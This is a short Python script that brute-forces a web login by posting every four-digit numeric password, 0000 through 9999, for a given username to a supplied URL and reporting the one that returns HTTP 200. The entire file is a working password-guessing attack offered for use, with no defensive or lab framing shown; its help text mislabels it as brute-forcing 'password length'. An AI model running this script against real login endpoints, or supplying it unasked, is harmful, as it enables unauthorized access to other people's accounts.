import requests
import argparse

parser = argparse.ArgumentParser(description="Brute force password length.")
parser.add_argument("-url", type=str, required=True, help="URL of the login endpoint")
parser.add_argument("-username", type=str, required=True, help="Username for the login")
args = parser.parse_args()

url = args.url
username = args.username

headers = {
    "Content-Type": "application/json"
}

for password in range(0000, 10000):
    password_str = str(password).zfill(4)
    payload = {
        "username": username,
        "password": password_str
    }

    response = requests.post(url, json=payload, headers=headers) 
    if response.status_code == 200:
        print(f"\nLogin successful with password: {password_str}")
        exit()
    else:
        print(f"\rLogin failed with password: {password_str}", end='')
        # print(f"Login failed with password: {password_str}")

print("All attempts failed.")   